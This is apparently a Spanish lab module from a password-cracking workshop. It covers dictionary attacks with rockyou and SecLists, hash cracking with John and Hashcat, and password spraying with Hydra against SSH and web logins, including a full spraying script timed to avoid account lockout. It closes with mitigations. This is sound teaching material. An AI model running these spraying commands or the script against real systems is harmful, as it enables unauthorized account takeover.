# Módulo 2: Ataques con Diccionario

## 🎯 Objetivos de Aprendizaje

- Comprender por qué los diccionarios son efectivos
- Utilizar rockyou.txt y otros wordlists
- Aprender a combinar diccionarios
- Analizar casos reales de filtraciones

## 📖 Teoría

### ¿Por qué funcionan los diccionarios?

Los humanos somos **predecibles** al crear contraseñas:

1. Usamos palabras del diccionario
2. Incorporamos fechas significativas
3. Reutilizamos contraseñas entre servicios
4. Seguimos patrones comunes (Password123, Admin2024)

### Ventajas sobre fuerza bruta

| Aspecto | Fuerza Bruta | Diccionario |
|---------|-------------|-------------|
| Cobertura | 100% eventual | ~10-40% inmediato |
| Velocidad | Extremadamente lento | Muy rápido |
| Eficiencia | Baja | Alta |
| Dependencia | Ninguna | Calidad del wordlist |

### rockyou.txt: El diccionario más famoso

**Origen**: Filtración de RockYou (2009)
- **32 millones** de usuarios afectados
- Contraseñas almacenadas en **texto plano**
- Reveló patrones reales de usuarios

**Top 10 contraseñas** (de rockyou.txt):
1. 123456
2. password
3. 12345678
4. qwerty
5. abc123
6. monkey
7. 1234567
8. letmein
9. trustno1
10. dragon

## 🛠️ Herramientas

### Wordlists incluidas en Kali

```bash
# Ubicación estándar
/usr/share/wordlists/

# Extraer rockyou.txt
gunzip /usr/share/wordlists/rockyou.txt.gz

# Ver primeras líneas
head -20 /usr/share/wordlists/rockyou.txt

# Contar total de contraseñas
wc -l /usr/share/wordlists/rockyou.txt
```

### SecLists - El estándar actual

**SecLists** es la colección más completa y actualizada de listas para pentesting.

**¿Por qué SecLists?**
- ✅ Mantenido activamente (actualizado en 2024)
- ✅ Categorizado por tipo de ataque
- ✅ Incluye listas especializadas
- ✅ Estándar de la industria

```bash
# Clonar repositorio (recomendado)
git clone https://github.com/danielmiessler/SecLists.git /opt/SecLists

# O instalar en Kali (viene preinstalado)
apt install seclists
ls /usr/share/seclists/Passwords/

# Estructura de Passwords/
ls /opt/SecLists/Passwords/
# Common-Credentials/     - Contraseñas comunes por servicio
# Leaked-Databases/       - De filtraciones reales
# Default-Credentials/   - Credenciales por defecto
# Keyboard-Walks/        - Patrones de teclado
# Honeypot-Captures/     - Capturadas de honeypots
```

**Wordlists destacadas**:

| Archivo | Tamaño | Uso |
|---------|--------|-----|
| `10-million-password-list-top-1000000.txt` | 1M | General purpose |
| `darkweb2017-top10000.txt` | 10K | Dark web leaks |
| `xato-net-10-million-passwords-10000.txt` | 10K | Rápido |
| `2024-200_most_used_passwords.txt` | 200 | Más reciente (2024) |
| `richelieu-french.txt` | ~2K | Específico francés |
| `spanish-top201.txt` | 201 | **Español** |

### Probable-Wordlists & Weakpass

Además de SecLists, existen proyectos enfocados en la **probabilidad estadística**:

- **[Probable-Wordlists](https://github.com/berzerk0/Probable-Wordlists)**: Listas ordenadas estadísticamente. Ideal para optimizar tiempos.
- **[Weakpass](https://weakpass.com)**: Ofrece desde "Top 100k" (muy rápido) hasta listas de 100GB para cracking con GPU.

### Diccionarios Regionales: Palabrario (Español) 🇪🇸

Las contraseñas dependen del **idioma** y la **cultura**. `rockyou.txt` es muy anglocéntrico.
Para auditorías en España/Latam, es vital usar diccionarios en castellano.

**[Palabrario](https://github.com/pcaro90/palabrario)** es una colección curada de diccionarios:
- `diccionario_espanol.txt`: Palabras generales.
- `nombres.txt`, `apellidos.txt`: Esencial para crear usuarios.
- `lugares.txt`: Ciudades, provincias.

```bash
# Ubicación en el taller
ls /opt/palabrario/files/
```

```bash
# Descargar wordlist específica de SecLists
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt -O /wordlists/seclists-top10k.txt
```

## 💻 Ejercicios Prácticos

### Preparación

```bash
cd /exercises/module2

# Verificar archivos
ls -lh
# hashes_common.txt - 40 hashes SHA-256 de contraseñas comunes
```

### Ejercicio 1: Usar rockyou.txt subset 🟢

El ejercicio incluye un subset de 100,000 contraseñas más comunes.

#### Con John the Ripper

```bash
# Ataque básico con wordlist
john --format=raw-sha256 --wordlist=/wordlists/rockyou-subset.txt hashes_common.txt

# Ver progreso
john --show --format=raw-sha256 hashes_common.txt
```

#### Con Hashcat

```bash
# Modo diccionario (-a 0)
hashcat -m 1400 -a 0 hashes_common.txt /wordlists/rockyou-subset.txt

# Ver crackeados
hashcat -m 1400 hashes_common.txt --show
```

**Pregunta**: ¿Cuántos hashes crackeaste? ¿Qué porcentaje del total?

---

### Ejercicio 2: Rockyou completo 🟡

Si el subset no crackea todos los hashes, usa rockyou completo.

#### Preparar rockyou en el contenedor

```bash
# Copiar desde Kali (si está disponible)
cp /usr/share/wordlists/rockyou.txt /wordlists/

# O descargar
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O /wordlists/rockyou.txt
```

#### Ejecutar ataque

```bash
# Con Hashcat (recomendado por velocidad)
hashcat -m 1400 -a 0 hashes_common.txt /wordlists/rockyou.txt

# Tiempo estimado: 2-5 minutos en hardware moderno
```

---

### Ejercicio 3: SecLists Top 10K 🟡

Probar con wordlist moderna de SecLists.

```bash
# Usar SecLists Top 10K
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt -O /wordlists/seclists-top10k.txt

# Ataque
hashcat -m 1400 -a 0 hashes_common.txt /wordlists/seclists-top10k.txt

# Comparar con rockyou
echo "Crackeados con SecLists:"
hashcat -m 1400 hashes_common.txt --show | wc -l
```

**Reflexión**: ¿SecLists crackea hashes que rockyou no encontró?

---

### Ejercicio 4: Combinar wordlists 🔴

Combinar múltiples fuentes para mayor cobertura.

```bash
# Combinar wordlists
cat /wordlists/rockyou-subset.txt > /tmp/combined.txt
cat /wordlists/seclists-top10k.txt >> /tmp/combined.txt
cat /usr/share/wordlists/fasttrack.txt >> /tmp/combined.txt

# Eliminar duplicados
sort /tmp/combined.txt | uniq > /wordlists/combined-unique.txt

# Contar total
wc -l /wordlists/combined-unique.txt

# Usar en ataque
hashcat -m 1400 -a 0 hashes_common.txt /wordlists/combined-unique.txt
```

---

## 🌍 Casos Reales de Filtraciones

### LinkedIn (2012)

- **6.5 millones** de hashes SHA-1 filtrados
- **Sin salt** (sal criptográfica)
- 95% crackeados en días con diccionarios

**Lección**: SHA-1 sin salt es insuficiente.

### Adobe (2013)

- **150 millones** de registros
- Cifrado simétrico débil
- Muchas contraseñas idénticas (mismo cifrado)

**Pista**: Las contraseñas más comunes eran "123456", "password", "adobe123"

### MySpace (2016)

- **427 millones** de credenciales
- Hashes SHA-1 sin salt
- Vendidas en dark web

---

## 📊 Análisis de Wordlists

### Estadísticas de rockyou.txt

```bash
# Total de líneas
wc -l /wordlists/rockyou.txt

# Contraseñas más comunes (top 20)
head -20 /wordlists/rockyou.txt

# Contraseñas que contienen "password"
grep -i "password" /wordlists/rockyou.txt | head -10

# Longitud promedio
awk '{ total += length($0); count++ } END { print total/count }' /wordlists/rockyou.txt
```

### Crear subset personalizado

```bash
# Solo contraseñas de 8+ caracteres
awk 'length($0) >= 8' /wordlists/rockyou.txt > rockyou-8plus.txt

# Solo contraseñas con números
grep '[0-9]' /wordlists/rockyou.txt > rockyou-with-numbers.txt

# Top 1000
head -1000 /wordlists/rockyou.txt > rockyou-top1000.txt
```

---

## 🧪 Experimentos Adicionales

### Comparar eficiencia: Diccionario vs Fuerza Bruta

```bash
# 1. Anotar tiempo con diccionario
time hashcat -m 1400 -a 0 hashes_common.txt /wordlists/rockyou-subset.txt

# 2. Intentar fuerza bruta (ADVERTIR: puede tardar días)
# hashcat -m 1400 -a 3 hashes_common.txt ?a?a?a?a?a?a?a?a --runtime=60
```

**Conclusión esperada**: Diccionario es **órdenes de magnitud** más rápido.

---

## 🔄 Password Spraying vs Credential Stuffing

### Diferencias clave

| Aspecto | Password Spraying | Credential Stuffing |
|---------|------------------|---------------------|
| **Método** | 1 password → muchos usuarios | Pares usuario:password específicos |
| **Requisito** | Lista de usuarios | Credenciales filtradas |
| **Velocidad** | Lento (evita lockout) | Puede ser rápido |
| **Tasa éxito** | Baja (5-15%) | Alta (10-40%) |
| **Detección** | Media | Difícil |

### ¿Qué es Password Spraying?

**Definición**: Intentar **una contraseña común** contra **muchos usuarios** para evitar bloqueos de cuenta.

**Ejemplo**:
```
Usuarios: admin, user1, user2, ..., user1000
Password: Winter2024!
Intentos: 1 intento por usuario = 1000 intentos totales
```

Vs tradicional brute force:
```
Usuario: admin
Passwords: password, password1, password123, ...
Intentos: 1000 intentos en 1 cuenta → BLOQUEADA
```

---

### Ejercicio 5: Password Spraying con Hydra 🌟

#### Escenario

Tienes una lista de usuarios del sistema SSH y quieres probar contraseñas comunes.

#### Paso 1: Crear lista de usuarios

```bash
cat > /tmp/ssh_users.txt << EOF
root
admin
testuser
user
demo
guest
support
service
backup
monitor
EOF
```

#### Paso 2: Lista de contraseñas comunes

```bash
cat > /tmp/common_passwords.txt << EOF
password
Password1!
Winter2024!
Company123!
admin
letmein
welcome
123456
changeme
default
EOF
```

#### Paso 3: Password Spraying

**Opción A: Una password a la vez** (recomendado para evitar lockout)

```bash
# Probar "password" contra todos los usuarios
hydra -L /tmp/ssh_users.txt -p "password" ssh://ssh-target:2222 -t 1

# Esperar 5 minutos (simular delay real)
sleep 300

# Probar "Password1!" contra todos
hydra -L /tmp/ssh_users.txt -p "Password1!" ssh://ssh-target:2222 -t 1
```

**Opción B: Automatizado con script**

```bash
#!/bin/bash
# password_spray.sh

USERS="/tmp/ssh_users.txt"
PASSWORDS="/tmp/common_passwords.txt"
TARGET="ssh://ssh-target:2222"
DELAY=60  # Segundos entre intentos

echo "[*] Iniciando password spraying..."
echo "[*] Usuarios: $(wc -l < $USERS)"
echo "[*] Passwords a probar: $(wc -l < $PASSWORDS)"

while read password; do
    echo ""
    echo "[+] Probando password: $password"
    hydra -L "$USERS" -p "$password" "$TARGET" -t 1 -f
    
    if [ $? -eq 0 ]; then
        echo "[!] ENCONTRADA: $password"
    fi
    
    echo "[*] Esperando ${DELAY}s antes del siguiente intento..."
    sleep $DELAY
done < "$PASSWORDS"

echo ""
echo "[*] Password spraying completado"
```

Ejecutar:
```bash
chmod +x password_spray.sh
./password_spray.sh
```

---

### Password Spraying contra formularios web

```bash
# DVWA login spray
hydra -L /tmp/ssh_users.txt -p "password" dvwa http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Login failed" -t 1
```

---

### Mitigaciones contra Password Spraying

1. **Account Lockout Policies** (pero con threshold alto)
   - Ej: 10 intentos en 1 hora (no 3 en 5 minutos)

2. **Detección de patrones**
   - Alertar si muchos usuarios fallan con la misma password

3. **Multi-Factor Authentication (MFA)**
   - Hace el ataque inútil

4. **Password Policies**
   - Prohibir contraseñas comunes (usar SecLists para validación)

5. **Monitoring de logs**
   ```bash
   # Detectar password spraying en logs
   grep "Failed password" /var/log/auth.log | \
     awk '{print $11}' | sort | uniq -c | sort -rn
   ```

---

## 📚 Recursos de Wordlists

### Públicos - Por Popularidad

1. **[SecLists](https://github.com/danielmiessler/SecLists)** ⭐ Más usado actualmente
   - Passwords, usernames, URLs, fuzzing
   - Actualizado regularmente

2. **[RockYou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)** ⭐ Clásico
   - 14M contraseñas reales
   - De filtración 2009

3. **[RockYou2024](https://cybernews.com/security/rockyou2024-password-leak/)** 🆕
   - 10 mil millones de contraseñas
   - Compilación más grande hasta la fecha

4. **[CrackStation](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)**
   - 15GB comprimido
   - Altísima cobertura

5. **[Weakpass](https://weakpass.com/)**
   - Colección curada
   - Múltiples fuentes

### Especializados

- `fasttrack.txt` - Contraseñas de equipos de pentesting (Kali)
- `john.txt` - Wordlist por defecto de John the Ripper
- SecLists específicos:
  - `spanish-top201.txt` - Español
  - `finnish_passwd.txt` - Finés
  - `dutch_common_wordlist.txt` - Holandés

---

## 🤔 Preguntas de Reflexión

1. **Psicología**: ¿Por qué los humanos eligen contraseñas predecibles?

2. **Equilibrio**: ¿Qué características hacen una contraseña memorable pero segura?

3. **Evidencia**: Si crackeaste el 80% de hashes con diccionario, ¿qué nos dice sobre los usuarios?

4. **Defensa**: Como desarrollador, ¿implementarías alguna validación contra wordlists conocidas?

---

## 📊 Verificación de Progreso

```bash
# Contar hashes crackeados
hashcat -m 1400 hashes_common.txt --show | wc -l
```

**Objetivos**:
- Con rockyou-subset: ≥ 25/40 (62%)
- Con rockyou completo: ≥ 35/40 (87%)

---

## ✅ Criterios de Completitud

Has completado este módulo cuando:

- [ ] Crackeaste al menos 25 hashes con el subset
- [ ] Probaste SecLists y comparaste con rockyou
- [ ] Comprendes por qué los diccionarios son efectivos
- [ ] Ejecutaste un ataque de password spraying
- [ ] Entiendes la diferencia entre spraying y credential stuffing
- [ ] Investigaste al menos un caso real de filtración
- [ ] Creaste un subset personalizado

---

**Anterior**: [Módulo 1 - Fuerza Bruta](../module1/README.md)  
**Siguiente**: [Módulo 3 - Diccionarios Personalizados](../module3/README.md)
